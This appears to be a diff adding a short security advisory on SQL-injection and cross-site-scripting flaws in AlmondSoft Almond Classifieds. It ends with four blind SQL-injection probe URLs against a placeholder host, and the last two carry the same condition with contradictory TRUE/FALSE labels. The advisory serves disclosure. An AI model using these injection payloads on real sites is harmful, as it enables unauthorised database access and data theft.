@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/35816/info
+
+AlmondSoft Almond Classifieds is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+AlmondSoft Almond Classifieds Enterprise, Pro, and WAP Editions are vulnerable. 
+
+http://www.example.com/clnt/index.php?ct=manw_repl&md=add_form&replid=11438   and 1=1 <= TRUE
+http://www.example.com/clnt/index.php?ct=manw_repl&md=add_form&replid=11438   and 1=2 <= FALSE
+http://www.example.com/clnt/index.php?ct=manw_repl&md=add_form&replid=11438+AND SUBSTRING(@@version,1,1)=5=> TRUE
+http://www.example.com/clnt/index.php?ct=manw_repl&md=add_form&replid=11438+AND SUBSTRING(@@version,1,1)=5=> FALSE
